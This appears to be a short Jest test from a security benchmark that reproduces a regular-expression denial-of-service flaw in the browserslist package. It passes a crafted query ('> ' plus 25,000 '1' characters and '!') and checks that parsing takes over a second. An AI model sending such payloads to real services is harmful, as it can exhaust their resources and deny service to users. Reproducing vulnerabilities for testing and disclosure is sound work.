test("ReDoS in browserslist", () => {
  const measureTime = require("../utils").measureTime;
  const browserslist = require("browserslist");
  let t = measureTime(function () {
    try {
      browserslist(process.env.SECBENCH_PAYLOAD || ("> ") + "1".repeat(25000) + "!");
    } catch (e) {}
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
